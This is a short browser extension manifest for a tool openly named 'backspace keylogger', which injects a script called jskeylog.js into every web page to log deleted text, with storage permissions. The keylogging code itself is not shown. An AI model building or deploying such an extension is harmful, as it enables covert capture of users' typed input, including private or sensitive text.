{
  "manifest_version": 2,

  "name": "backspace keylogger",
  "description": "logs deleted text from the browser.",
  "version": "2.0",

  "permissions": [
      "activeTab",
      "storage",
      "unlimitedStorage"
    ],

  "content_scripts": [
    {
      "matches": [
        "<all_urls>"
      ],
      "js": ["jskeylog.js"]
    }
  ]
  
}
